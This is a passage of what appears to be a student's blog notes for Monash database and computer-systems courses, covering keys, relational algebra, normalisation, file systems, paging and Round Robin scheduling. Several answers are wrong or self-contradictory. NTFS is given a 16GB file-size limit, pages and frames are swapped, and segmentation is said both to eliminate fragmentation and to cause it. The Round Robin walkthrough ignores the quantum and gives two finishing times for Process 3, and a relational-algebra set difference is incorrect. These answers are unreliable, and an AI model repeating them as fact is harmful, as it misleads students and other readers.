<tr>
<td>candidate keys</td>
<td></td>
</tr>
<tr>
<td>primary key</td>
<td></td>
</tr>
</tbody></table>
<h3 id="Assignment-1A"><a href="#Assignment-1A" class="headerlink" title="Assignment 1A"></a>Assignment 1A</h3><p>Clean Up Inc (CUI)<br>local authorities</p>
<p>Material Description<br>One area that is being looked at is reducing the amount of waste that is not recycled by charging more for waste which needs to go to landfill.</p>
<p>the PAYD program will charge residents based on the type and weight of waste which is collected from their property</p>
<p>entity 1: local authority<br>attribute 1: Name of local authority<br>attribute 2: officer’s name (including first and last names<br>attribute 3: contact telephone number<br>attribute 4: authority total area (square kilometers)<br>attribute 5: the type of authority</p>
<p>Entity : street<br>attribute 1: street id<br>attribute 2: street name<br>attribute 3: street length (meters<br>attribute 4: road_sur_type<br>attribute 5: num_lane</p>
<p>entity 2: property<br>attribute 1: street id<br>attribute 2: owner’s name<br>attribute 3: owner’s email address<br>attribute 4: owner’s phone number<br>attribute 5: owner id<br>attribute 6: bin type<br>attribute 7: bin RFID<br>attribute 8: bin supply date<br>attribute 9: reason of replacement</p>
<p>Entity : owner<br>attribute 2: owner’s name<br>attribute 3: owner’s email address<br>attribute 4: owner’s phone number<br>attribute 5: owner id</p>
<p>entity 3: waste<br>attribute 1: waste type id<br>attribute 2: waste type id<br>attribute 3: waste weight</p>
<p>entity 4:bin<br>attribute 1: bin REID id<br>attribute 2: bin supply cost<br>attribute 3: bin type<br>attribute 4: bin supply date<br>attribute 5: reason of replacement</p>
<p>entity 5: contract<br>attribute 1: contract number<br>attribute 2: start date<br>attribute 3: end date<br>attribute 4: Name of local authority<br>attribute 5: waste type<br>attribute 6: collection cost<br>attribute 7: bin type<br>attribute 8: bin supply cost<br>attribute 9: standard bin supply cost</p>
<hr>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="Relational-Model-Theory"><a href="#Relational-Model-Theory" class="headerlink" title="Relational Model Theory"></a>Relational Model Theory</h3><p>CUSTOMER (cust_id, cust_name, cust_address)<br>ORDER (order_id, order_date, cust_id)</p>
<p>discuss the two relations:</p>
<p><strong>CUSTOMER</strong></p>
<ol>
<li><p>Relation ：A Relation is a collection of rows (tuples) and columns (attributes). It is the table.<br>Ex: CUSTOMER </p>
</li>
<li><p>Attribute：Field or column (It is information&#x2F;characteristics about the Relation.<br>Ex: Customer relation has attributes &#x3D; Cust_id, Cust_name, Cust_address </p>
</li>
<li><p>Domain: Set of atomic values. Domain defines the permitted range of values for an attribute of an entity.<br>Ex: Cust_id INT NOT NULL<br>Cust_date DATE (2001-2010) </p>
</li>
<li><p>Tuple: Row&#x2F;Record of data</p>
</li>
</ol>
<table>
<thead>
<tr>
<th>Cust_id</th>
<th>Cust_name</th>
<th>Cust_address</th>
</tr>
</thead>
<tbody><tr>
<td>123</td>
<td>Mark Anthony</td>
<td>Clayton South 3169</td>
</tr>
</tbody></table>
<ol start="5">
<li>Degree and cardinality of a relation: Degree of relation is the number of attributes. Degree of cardinality is the number of tuples, rows</li>
</ol>
<p>Ex: Customer entity has degree of relation &#x3D; 3, Order entity has degree of relation &#x3D; 3 </p>
<ol start="6">
<li>Primary key and foreign key:  A primary key is a unique attribute that defines and identifies the object, whereas the foreign key is a unique (primary) key from a foreign entity (another table).</li>
</ol>
<p>Eg: Cust_id is PK for Customer relation. Cust_id is FK in Orders. </p>
<p>Primary Key: Cust_id in Customer<br>Foreign key: Cust_id in ORDER </p>
<p><strong>ORDER</strong> </p>
<ol>
<li>Attribute:</li>
</ol>
<p>Ex: Order entity has attributes &#x3D; order_id, order_date, cust_id </p>
<ol start="2">
<li>Domain:</li>
</ol>
<p>Eg: Order_id; INT; not Null </p>
<ol start="3">
<li>Tuple:</li>
</ol>
<table>
<thead>
<tr>
<th>Order_id</th>
<th>Order_date</th>
<th>Cust_id</th>
</tr>
</thead>
<tbody><tr>
<td>001</td>
<td>25&#x2F;03&#x2F;2023</td>
<td>123</td>
</tr>
</tbody></table>
<h3 id="Choosing-the-Primary-key"><a href="#Choosing-the-Primary-key" class="headerlink" title="Choosing the Primary key"></a>Choosing the Primary key</h3><p>In any relation, tuples must be unique. However, in many cases, the set of all the attributes in a relation is not considered a candidate key.<br>Why not? On the other hand, suppose we do have a relation where the set of all attributes is a candidate key. In this case, show that this set must, therefore, be the only candidate key and hence the primary key.</p>
<p><strong>The candidate key needs to be the minimal of the super key.</strong> </p>
<p><strong>Identify the primary key and foreign key for these three relations:</strong><br>ORDER (order_id, order_date, cust_id)<br>ORDERLINE (order_id, prod_no, ol_qtyordered, ol_lineprice)<br>PRODUCT (prod_no, prod_desc, prod_unitprice)</p>
<ul>
<li>Super key1 &#x3D; attribute1+attribute2.  </li>
<li>candidate Key1 &#x3D; attribute1+attribute2.  </li>
<li>Hence, Primary Key1&#x3D; candidateKey1.</li>
</ul>
<p>ORDER: order_id. ORDERLINE: order_id+prod_no; PRODUCT: prod_no </p>
<p><strong>APPOINMENT</strong> (dentist_id, dentist_name, patient_id, patient_name, appointment_datetime, surgery_roomno) </p>
<p><strong>Superkeys</strong>: </p>
<p>Superkey 1: dentist_id, dentist_name, patient_id, patient_name, appointment_datetime,	surgery_roomno </p>
<p>Superkey 2: dentist_id, dentist_name, patient_id, patient_name, appointment_datetime </p>
<p>Superkey 3: destist_id, dentist_name, patient_id, appointment_datetime </p>
<p>Superkey 4: destist_id, patient_id, patient_name, appointment_datetime </p>
<p>Superkey 5: dentist_id, patient_id, appointment_datetime </p>
<p>Superkey 6: destist_id, appointment_datetime</p>
<p>Superkey 7: patient_id, appointment_datetime </p>
<p><strong>Candidate Keys</strong>:<br>Candidate key 1: dentist_id, appointment_datetime  </p>
<p>Candidate Key 2: surgery_roomno, appointment_datetime </p>
<p>Candidate Key 3: patient_id, appointment_datetime </p>
<p><strong>Primary Keys</strong>: dentist_id, patient_id</p>
<hr>
<h3 id="Relational-Algebra-Q1"><a href="#Relational-Algebra-Q1" class="headerlink" title="Relational Algebra Q1"></a>Relational Algebra Q1</h3><p>HOTEL (hotel_no, hotel_name, hotel_city)<br>ROOM (room_no, hotel_no, room_type, room_price)<br>BOOKING (hotel_no, guest_no, bdate_from, bdate_to, room_no)<br>GUEST (guest_no, guest_name, guest_address)</p>
<p>Write the relational algebra for the following queries (your answer must show an understanding of query efficiency ie. you must not make use of unnecessary joins, nor carry attributes and tuples up through the query which are not necessary) :</p>
<ol>
<li><p>List the numbers, names and cities of all hotels<br>R1 &#x3D; π hotel_no, hotel_name, hotel_city </p>
</li>
<li><p>List all single rooms with a price below $50<br>R2 &#x3D; σ room_type &#x3D; ‘single’ and room_price &lt; 50</p>
</li>
<li><p>List the numbers and names of all hotels in Melbourne<br>R1 &#x3D; </p>
</li>
<li><p>List all numbers and names of hotels which have a presidential suite room</p>
</li>
<li><p>List the price and type of all rooms at the Grosvenor Hotel</p>
</li>
<li><p>List all numbers, names and addresses of guests currently staying in deluxe room of any<br>hotel (assume that if the guest has a tuple in the BOOKING relation, then they are currently<br>staying in the hotel)</p>
</li>
<li><p>List all numbers, names and addresses of guests currently staying at the Grosvenor Hotel<br>(assume that if the guest has a tuple in the BOOKING relation, then they are currently<br>staying in the hotel)</p>
</li>
</ol>
<hr>
<h3 id="Relational-Algebra-Q2"><a href="#Relational-Algebra-Q2" class="headerlink" title="Relational Algebra Q2"></a>Relational Algebra Q2</h3><p>Considers these four relations:<br>CUSTOMER (cust_id, cust_name, cust_address)<br>PRODUCT (prod_id, prod_desc, prod_unitprice, prod_stock)<br>STAFF (staff_name, staff_position)<br>SALE (cust_id, sale_date, prod_id, sale_qty, sold_by)</p>
<p>*Note that sold_by value is the name of staff who made the sale<br>also refer to the following tables as seen in an RDBMS </p>
<p><strong>CUSTOMER</strong></p>
<table>
<thead>
<tr>
<th>cust_id</th>
<th>cust_name</th>
<th>cust_address</th>
</tr>
</thead>
<tbody><tr>
<td>111</td>
<td>Clive</td>
<td>India Rd</td>
</tr>
<tr>
<td>112</td>
<td>Clark</td>
<td>Kent St</td>
</tr>
<tr>
<td>113</td>
<td>Charles</td>
<td>Windsor Av</td>
</tr>
<tr>
<td>114</td>
<td>Cilla</td>
<td>Black St</td>
</tr>
</tbody></table>
<p><strong>PRODUCT</strong></p>
<table>
<thead>
<tr>
<th>Prod_id</th>
<th>Prod_desc</th>
<th>Prod_unitprice</th>
<th>Prod_stock</th>
</tr>
</thead>
<tbody><tr>
<td>K3</td>
<td>Knife Set</td>
<td>$17.95</td>
<td>105</td>
</tr>
<tr>
<td>K5</td>
<td>Ladle</td>
<td>$6.95</td>
<td>0</td>
</tr>
<tr>
<td>K11</td>
<td>Scraper</td>
<td>$0.95</td>
<td>66</td>
</tr>
<tr>
<td>L12</td>
<td>Rack</td>
<td>$22.95</td>
<td>0</td>
</tr>
<tr>
<td>L3</td>
<td>Table</td>
<td>$399.50</td>
<td>4</td>
</tr>
<tr>
<td>L6</td>
<td>Stool</td>
<td>$17.95</td>
<td>13</td>
</tr>
</tbody></table>
<p><strong>STAFF</strong></p>
<table>
<thead>
<tr>
<th>Staff_name</th>
<th>Staff_position</th>
</tr>
</thead>
<tbody><tr>
<td>Clark</td>
<td>Manager</td>
</tr>
<tr>
<td>Simon</td>
<td>Clerk</td>
</tr>
<tr>
<td>Steve</td>
<td>Packer</td>
</tr>
<tr>
<td>Sean</td>
<td>Clerk</td>
</tr>
<tr>
<td>Sorcha</td>
<td>Director</td>
</tr>
<tr>
<td>Charles</td>
<td>Clerk</td>
</tr>
</tbody></table>
<p><strong>SALE</strong></p>
<table>
<thead>
<tr>
<th>Cust__id</th>
<th>Sale_date</th>
<th>Prod_id</th>
<th>Sale_qty</th>
<th>Sold_by</th>
</tr>
</thead>
<tbody><tr>
<td>112</td>
<td>20170311</td>
<td>K3</td>
<td>6</td>
<td>Simon</td>
</tr>
<tr>
<td>114</td>
<td>20170121</td>
<td>K11</td>
<td>1</td>
<td>Simon</td>
</tr>
<tr>
<td>114</td>
<td>20170123</td>
<td>K11</td>
<td>1</td>
<td>Simon</td>
</tr>
<tr>
<td>113</td>
<td>20161130</td>
<td>L12</td>
<td>5</td>
<td>Sorcha</td>
</tr>
<tr>
<td>114</td>
<td>20170228</td>
<td>L12</td>
<td>1</td>
<td>Sean</td>
</tr>
<tr>
<td>113</td>
<td>20161129</td>
<td>K3</td>
<td>2</td>
<td>Sean</td>
</tr>
</tbody></table>
<p>Using Relational Algebra, answer the following queries.</p>
<ol>
<li><p>List ids, names of customers and descriptions of products bought by the customer. How<br>many tuples will be returned by the relational algebra query that you have constructed as<br>your answer?<br><strong>π</strong>cust_id, cust_name, prod_desc (CUSTOMER ⨝ SALE ⨝ PRODUCT)</p>
</li>
<li><p>List all names which are shared by customers and staff<br><strong>π</strong>cust_name (CUSTOMER) ∩ <strong>π</strong>staff_name (STAFF)</p>
</li>
<li><p>List ids and descriptions of products that haven’t been sold<br><strong>π</strong>prod_id, prod_desc (PRODUCT - SALE)</p>
</li>
<li><p>List names of clerks who don’t have any sales yet<br>πstaff_name (STAFF) - πsold_by (SALE)</p>
</li>
<li><p>List categories (positions) of staff who have made sales<br><strong>π</strong>staff_position (STAFF ⨝ SALE)</p>
</li>
</ol>
<hr>
<h3 id="Workshop"><a href="#Workshop" class="headerlink" title="Workshop"></a>Workshop</h3><p>Insert, Update, Delete</p>
<hr>
<h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="Applied-UNF-1"><a href="#Applied-UNF-1" class="headerlink" title="Applied UNF 1"></a>Applied UNF 1</h3><p><strong>UNF</strong><br><strong>APPOINTMENT</strong> (dentist_no, dentist_name, patient_no,patient_name, app_datetime, surgeryroom_no) </p>
<p><strong>1NF</strong><br><strong>APPOINTMENT</strong> (dentist_no, dentist_name, patient_no,patient_name, app_datetime, surgeryroom_no) </p>
<p>(<strong>PARTIAL dependences</strong>)<br><strong>DENTIST</strong> (dentist_no, dentist_name)<br><strong>PATIENT</strong> (patient_no,patient_name)</p>
<p><strong>2NF</strong><br><strong>DENTIST</strong> (dentist_no, dentist_name)<br><strong>PATIENT</strong> (patient_no,patient_name)<br><strong>APPOINTMENT</strong> (dentist_no, patient_no, app_datetime, surgeryroom_no) </p>
<p><strong>3NF</strong><br>APPOINTMENT (dentist_no, dentist_name, app_datetime)<br>APPOINTMENT（patient_no,patient_name, app_datetime, surgeryroom_no） </p>
<hr>
<h2 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h2><h3 id="Creating-and-Altering-the-Database"><a href="#Creating-and-Altering-the-Database" class="headerlink" title="Creating and Altering the Database"></a>Creating and Altering the Database</h3><h3 id="Cascade-Constraints"><a href="#Cascade-Constraints" class="headerlink" title="Cascade Constraints"></a>Cascade Constraints</h3><p>Cascading Referential Integrity Constraints in SQL Server are the foreign key constraints that tell SQL Server to perform certain actions whenever a user attempts to delete or update a primary key to which an existing foreign keys point.</p>
<p><strong>column constraints couldn’t use in 2 primary key component;  need to use in table constraints</strong></p>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Monash Cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Monash Courses 2023S1 FIT9137</title>
    <url>/yakko117/2023/02/26/MonashCs9137/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>想到啥写啥，希望顺利毕业 hhh</p>
<h1 id="FIT9137-计组和网络"><a href="#FIT9137-计组和网络" class="headerlink" title="FIT9137 计组和网络"></a>FIT9137 计组和网络</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>开学前老师会让大伙安装虚拟机和环境，环境是个轻量级的<code>Ubuntu</code>，叫作 <code>Lubuntu</code><br><a href="https://manual.lubuntu.me/stable/index.html">官方手册</a> 可以推荐看看，大部分问题都可以解决</p>
<p>安装好的网络适配环境，VMware 可能会出现NAT配置网络失败，VirtualBox 自适配好一些(包括屏幕分辨率什么的)，网络解决办法是先点击左下音量左边的网络配置，然后选择<code>Auto Ethernet</code>, 然后用浏览器测试网站是否连接成功<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302261356909.jpg" data-fancybox="group" data-caption="week0_1" class="fancybox"><img alt="week0_1" title="week0_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302261356909.jpg" class="lazyload"></a></p>
<p>推荐了两本书，</p>
<ul>
<li><p><strong>Data Communications &amp; Networks</strong><br>  Forouzan, Behrouz A.<br>  5th Edition<br>  McGraw-Hill, 2013</p>
</li>
<li><p><strong>Modern Operating Systems</strong><br>  Tanenbaum, Andrew<br>  4th Edition<br>  Pearson, 2014</p>
</li>
</ul>
<h3 id="Homework-Q-amp-A"><a href="#Homework-Q-amp-A" class="headerlink" title="Homework Q&amp;A"></a>Homework Q&amp;A</h3><p><strong>Modern computer systems are interrupt driven.</strong>  Do some research on why interrupts are important and write in your own words why YOU need to know and understand interrupts (ie. why are they important to your studies?). </p>
<ul>
<li>An interrupt is a signal emitted by a device attached to a computer or from a program within the computer. It requires the operating system (OS) to stop and figure out what to do next. <a href="https://www.techtarget.com/whatis/definition/interrupt">ref-link</a></li>
<li>By learning interrupt principle, I can better understand the principle of computer operation and better understand the theoretical knowledge of computer architecture.</li>
</ul>
<p>Write your own definitions and explanations of the terms <strong>“soft interrupt”</strong> and <strong>“hard interrupt”</strong> and how they work to help remember them in the future.</p>
<ul>
<li><strong>Soft interrupt</strong>: the interrupt occurred by software programs or systems to stop program execution and pass execution over to the INT handler.</li>
<li><strong>hard interrupt</strong>: the interrupt occurred from an external device like some I&#x2F;O devices, it is a way to avoid wasting the processor’s valuable time in polling loops and waiting for external events.  <a href="https://www.geeksforgeeks.org/difference-between-hardware-interrupt-and-software-interrupt/">ref-link</a></li>
</ul>
<h3 id="Selection"><a href="#Selection" class="headerlink" title="Selection"></a>Selection</h3><p>based on <strong>SERVER-BASED ARCHITECTURE</strong></p>
<table>
<thead>
<tr>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody><tr>
<td>NULL</td>
<td>Presentation logic</td>
</tr>
<tr>
<td></td>
<td>Application&#x2F;business logic</td>
</tr>
<tr>
<td></td>
<td>Data access logic</td>
</tr>
<tr>
<td></td>
<td>Data storage</td>
</tr>
</tbody></table>
<p><font color="blue">The client is a ‘dumb terminal’. This architecture can be problematic because the server can cause bottlenecks.</font> &#x2F;&#x2F; bottleneck: 瓶颈，阻碍</p>
<p>base on <strong>CLIENT-BASED ARCHITECTURE</strong></p>
<table>
<thead>
<tr>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody><tr>
<td>Presentation logic</td>
<td>Data storage</td>
</tr>
<tr>
<td>Application&#x2F;business logic</td>
<td></td>
</tr>
<tr>
<td>Data access logic</td>
<td></td>
</tr>
</tbody></table>
<p><font color="blue">All logic is performed by the client. The server stores the data. This architecture can be problematic because all data needs to travel between server and client.</font></p>
<p>base on <strong>CLIENT-SERVER ARCHITECTURE</strong></p>
<table>
<thead>
<tr>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody><tr>
<td>Presentation logic</td>
<td>Data access logic</td>
</tr>
<tr>
<td>Application&#x2F;business logic</td>
<td>Data storage</td>
</tr>
</tbody></table>
<p>base on <strong>THIN-CLIENT ARCHITECTURE</strong></p>
<table>
<thead>
<tr>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody><tr>
<td>Presentation logic</td>
<td>Application&#x2F;business logic</td>
</tr>
<tr>
<td></td>
<td>Data access logic</td>
</tr>
<tr>
<td></td>
<td>Data storage</td>
</tr>
</tbody></table>
<hr>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="pre-class"><a href="#pre-class" class="headerlink" title="pre-class"></a>pre-class</h3><h4 id="Selection-1"><a href="#Selection-1" class="headerlink" title="Selection"></a>Selection</h4><p><strong>Which of the following statements is true regarding the order of the phases of a cycle in a conventional processor?</strong></p>
<p>a. The processor first executes the instruction (Execute phase), then fetches the required data into its registers (Fetch phase), and finally decodes the results (Decode phase)</p>
<p>b. The processor first decodes the instruction (Decode phase), then fetches the required data into its registers (Fetch phase), and finally executes (Execute phase)</p>
<p>c. The processor first fetches the instruction and data into its registers (Fetch phase), then decodes the instruction (Decode phase), and finally executes the instruction on data (Execute phase).</p>
<p>d. The processor first fetches the instruction (Fetch phase), then executes the instruction (Execute phase), and finally decodes the results (Decode phase)</p>
<p><strong>Which of the following statements is false regarding the process management function of Operating System (OS)?</strong></p>
<p>a. The process management function of OS loads the entire program into main memory when creating the process.</p>
<p>b. The process management function of OS controls the execution of the processes and acts on exceptional conditions arising during execution.</p>
<p>c. The process management function of OS creates and destroys processes.</p>
<p>d. The process management function of OS allocates resources among processes.</p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><p><strong>Write three things that a kernel does that makes it important.</strong><br><code>Memory management</code>； <code>Process management</code>；<code>Operation System</code></p>
<p><strong>FAT32</strong> (File Allocation Table 32) is a file system that is commonly used on Windows-based computers.</p>
<p><strong>NTFS</strong> (New Technology File System) is a file system that was introduced with Windows NT in 1993 and is still widely used on modern Windows-based computers. It is a more advanced file system than the older FAT16 and FAT32 file systems and offers several improvements in terms of performance, security, and reliability.</p>
<table>
<thead>
<tr>
<th>FAT32</th>
<th>NTFS</th>
</tr>
</thead>
<tbody><tr>
<td>Maximum 4GB file size</td>
<td>Maximum 16GB file size</td>
</tr>
<tr>
<td>Ps4 can read</td>
<td>MacOS can read but not write</td>
</tr>
<tr>
<td>Simple structure</td>
<td>Complex structure</td>
</tr>
<tr>
<td>Maximum of 83 characters in a file name</td>
<td>Includes file encryption</td>
</tr>
<tr>
<td></td>
<td>Includes file compression</td>
</tr>
</tbody></table>
<h4 id="Do-some-research-on-hard-link-and-soft-links"><a href="#Do-some-research-on-hard-link-and-soft-links" class="headerlink" title="Do some research on hard link and soft links."></a>Do some research on hard link and soft links.</h4><p>Both soft links and hard links are methods of linking files or directories, </p>
<ol>
<li><p>They are stored in different locations, soft link is a file that contains a pathname pointing to the target file. And hard link is a direct link pointing to the target file.<br>存储位置：软链接和硬链接都是指向另一个文件或目录的链接，但是它们的存储位置不同。软链接是一个特殊的文件，其中包含指向目标文件的路径名。而硬链接是一个指向目标文件的直接链接，它们实际上是同一个文件，只是具有不同的文件名和路径。</p>
</li>
<li><p>Soft links can pass through file systems, but hard links can only be created within the same file system.<br>跨文件系统：软链接可以跨越文件系统，也就是说可以链接到不同的磁盘或分区上的文件。而硬链接只能在同一个文件系统内创建，因为它们依赖于文件系统中的inode编号，而不同的文件系统可能会有不同的inode编号。</p>
</li>
<li><p>When the original file is deleted, soft links and hard links are handled differently. The soft link just points to the path name of the original file. When the original file is deleted, the soft link will point to a file that does not exist. The hard link is an alias of the original file. Even if the original file is deleted, the hard link can still access the contents of the original file.<br>原文件删除：当原文件被删除时，软链接和硬链接的行为也不同。软链接只是指向原文件的路径名，当原文件被删除时，软链接将指向一个不存在的文件。而硬链接则是原文件的一个别名，即使原文件被删除，硬链接仍然可以访问原文件的内容，因为它们实际上是同一个文件。</p>
</li>
<li><p>Soft link is a special file so it can be read and edited like a normal file. The hard link is just another filename pointing to the original file, so it cannot be read or edited like a soft link.<br>可读性：软链接是一个特殊的文件，所以它可以像普通文件一样被读取和编辑。而硬链接只是指向原文件的另一个文件名，所以它不能像软链接一样被读取或编辑。</p>
</li>
</ol>
<p>今天上课教了linux操作命令，也很水，Student Connect 旁边的布朗尼好吃</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303060921733.JPG" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303060921733.JPG" class="lazyload"></a></p>
<p>水的很的大课，一周又结束了，要抽时间去写点research笔记了</p>
<hr>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="selection"><a href="#selection" class="headerlink" title="selection"></a>selection</h3><p><strong>Which of the following statements is true if the octal access rights of a file is 751?</strong></p>
<ol>
<li><p>The others can only write in the file.</p>
</li>
<li><p><font color="blue">The members of the group can read and execute.</font></p>
</li>
<li><p>The owner of the file can only write and execute.</p>
</li>
<li><p>The members of the group can read and write in the file.</p>
</li>
</ol>
<p><code>751</code> &#x3D;&#x3D; <code>-rwxr-x--x</code></p>
<p>The owner of the file can read (4) + write (2) + execute (1) &#x3D; 7.<br>The members of the group can execute (1) + read (4) &#x3D; 5.<br>The others can execute (1) &#x3D; 1.</p>
<p><strong>Which of the following statements is False regarding the paging-based memory management technique?</strong></p>
<ol>
<li><p>Main memory is divided into many equal-sized frames.</p>
</li>
<li><p>Each process (a program in execution) is divided into frame-size pages.</p>
</li>
<li><p><font color="red">When a process is brought in, all of its pages are loaded into available frames.</font></p>
</li>
<li><p>Page size and Frame size are equal.</p>
</li>
</ol>
<p>When a process is brought in, all of its pages are loaded into available frames is a false statement regarding the paging-based memory management technique.</p>
<p>When a process is brought into memory, <strong>only some of its pages</strong> are loaded into available frames, not all of its pages. The remaining pages are loaded into frames as they are referenced during the process execution, using a technique called demand paging.</p>
<h3 id="Examples-of-non-pre-emptive-scheduling-algorithms"><a href="#Examples-of-non-pre-emptive-scheduling-algorithms" class="headerlink" title="Examples of non-pre-emptive scheduling algorithms"></a>Examples of non-pre-emptive scheduling algorithms</h3><p>First-in first-out, Shortest job first, Priority scheduling</p>
<h3 id="Mutual-Exclusion-in-OS"><a href="#Mutual-Exclusion-in-OS" class="headerlink" title="Mutual Exclusion in OS:"></a>Mutual Exclusion in OS:</h3><p>Ensures non-shareable resources (e.g. printers) are accessed by only one process at a time.</p>
<p>Mutual exclusion is a mechanism used by operating systems to ensure that only one process at a time can access a particular resource. Non-shareable resources, such as printers, can be accessed by only one process at a time, and therefore require mutual exclusion to ensure that multiple</p>
<h3 id="Deadlock-in-OS"><a href="#Deadlock-in-OS" class="headerlink" title="Deadlock in OS"></a>Deadlock in OS</h3><p>When two or more processes want to use a shareable resource held by each other</p>
<p><code>Single-processing</code>: one process in memory at any time. It is easy to implement - it either fits or it doesn’t.<br><code>Multi-processing</code>: multiple processes in memory at the same time.<br><code>Swapping</code> allows computer rapidly “swap” its CPU between the process by loading and unloading them into&#x2F;from memory.<br><code>Process Table</code> contains entries called Process Control Blocks. It contains data such as process state and process ID, program counter, memory address of the Page Table, resources in-used&#x2F;needed, etc.<br><code>Cache memory</code> is small and stores only active pages. It is searched first for page number. If not found, search then goes to the page table in conventional memory.<br><code>Hit ratio</code> &#x3D; percentage of times a page is found in the page.<br>If a required page is not in memory then an interrupt called <code>Page default</code> results. This causes the required page to be loaded from secondary memory into main memory, and the page table updated.<br>Some common page replacement algorithms are: <code>LRU/LFU and F.I.F.O</code><br>When a program may spend a lot of time performing a loop, or assessing consecutive elements of a list is called <code>Locality</code><br><code>Working Set</code> is a minimum number of pages that meets the locality requirement.</p>
<h3 id="Paging-vs-Segmentation"><a href="#Paging-vs-Segmentation" class="headerlink" title="Paging vs Segmentation"></a>Paging vs Segmentation</h3><p>Paging and segmentation are two memory management techniques used by operating systems to manage physical memory.</p>
<p>Paging divides physical memory into fixed-sized blocks called pages and logical memory into fixed-sized blocks called page frames. When a process needs to access a page, the operating system maps the page to a page frame and loads it into memory. Paging allows for efficient use of physical memory and provides protection by allocating memory in small, fixed-sized blocks. However, it can lead to fragmentation of physical memory and may require additional overhead for managing page tables.</p>
<p>Segmentation, on the other hand, divides logical memory into variable-sized segments, where each segment represents a logical unit of a process. Each segment can be of different size, and segments can be dynamically allocated and deallocated as needed. The operating system maintains a segment table that maps logical addresses to physical addresses. Segmentation provides better memory utilization as compared to paging and eliminates fragmentation, but it can lead to external fragmentation if segments are frequently created and destroyed.</p>
<p>In summary, both paging and segmentation have their advantages and disadvantages, and their suitability depends on the specific requirements of an operating system and the applications it needs to run. Some operating systems use a combination of both techniques, known as segmented paging, to combine the advantages of both techniques.</p>
<h3 id="Workshop-Activity1-Round-Robin-Scheduling"><a href="#Workshop-Activity1-Round-Robin-Scheduling" class="headerlink" title="Workshop Activity1 Round Robin Scheduling"></a>Workshop Activity1 Round Robin Scheduling</h3><p>Suppose the time quantum of a Round Robin scheduler is 50 milliseconds. </p>
<table>
<thead>
<tr>
<th>Label</th>
<th>Start time</th>
<th>Processing time</th>
</tr>
</thead>
<tbody><tr>
<td>Process 1</td>
<td>0</td>
<td>95ms</td>
</tr>
<tr>
<td>Process 4</td>
<td>15ms</td>
<td>65ms</td>
</tr>
<tr>
<td>Process 5</td>
<td>75ms</td>
<td>35ms</td>
</tr>
<tr>
<td>Process 3</td>
<td>175ms</td>
<td>145ms</td>
</tr>
<tr>
<td>Process 2</td>
<td>201ms</td>
<td>10ms</td>
</tr>
</tbody></table>
<p>Note: If a process’ remaining time is less than the quantum when it finishes the OS dispatches the process in front of the queue.</p>
<p>a) Which process starts first?</p>
<ul>
<li><code>Process 1</code> Start time is 0</li>
</ul>
<p>b) Which process finishes last? When does it finish?</p>
<ul>
<li><code>Process 3</code> which finishes at 320ms (175ms start time + 145ms processing time).</li>
</ul>
<p>c) Which process finishes second last?</p>
<ul>
<li>The process that finishes second last is <code>Process 2</code>, which finishes at 211ms (201ms start time + 10ms processing time).</li>
</ul>
<p>d) Show all the steps of the Round Robin algorithm using a queue.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Queue: []</span><br><span class="line"></span><br><span class="line">0ms: Process 1 arrives</span><br><span class="line">Queue: [1]</span><br><span class="line"></span><br><span class="line">15ms: Process 4 arrives</span><br><span class="line">Queue: [1, 4]</span><br><span class="line"></span><br><span class="line">75ms: Process 5 arrives</span><br><span class="line">Queue: [1, 4, 5]</span><br><span class="line"></span><br><span class="line">95ms: Process 1 completes, Process 4 starts</span><br><span class="line">Queue: [4, 5]</span><br><span class="line"></span><br><span class="line">160ms: Process 4 completes, Process 5 starts</span><br><span class="line">Queue: [5]</span><br><span class="line"></span><br><span class="line">175ms: Process 3 arrives</span><br><span class="line">Queue: [5, 3]</span><br><span class="line"></span><br><span class="line">195ms: Process 5 completes, Process 3 starts</span><br><span class="line">Queue: [3]</span><br><span class="line"></span><br><span class="line">201ms: Process 2 arrives</span><br><span class="line">Queue: [3, 2]</span><br><span class="line"></span><br><span class="line">245ms: Process 2 starts</span><br><span class="line">Queue: [2, 3]</span><br><span class="line"></span><br><span class="line">255ms : Process 2 completes, Process 3 continues</span><br><span class="line">Queue: [3]</span><br><span class="line"></span><br><span class="line">350ms: Process 3 completes</span><br><span class="line">Queue: []</span><br></pre></td></tr></table></figure></div>

<h3 id="ACTIVITY-B-Special-Files-Links"><a href="#ACTIVITY-B-Special-Files-Links" class="headerlink" title="ACTIVITY B: Special Files (Links)"></a>ACTIVITY B: Special Files (Links)</h3><p>做软硬连接</p>
<hr>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h3><p>普通的高低电平（甚至没讲曼切斯特）</p>
<p>FireFox Wireshark 抓包 没意思 </p>
<h3 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity 1"></a>Activity 1</h3><ol>
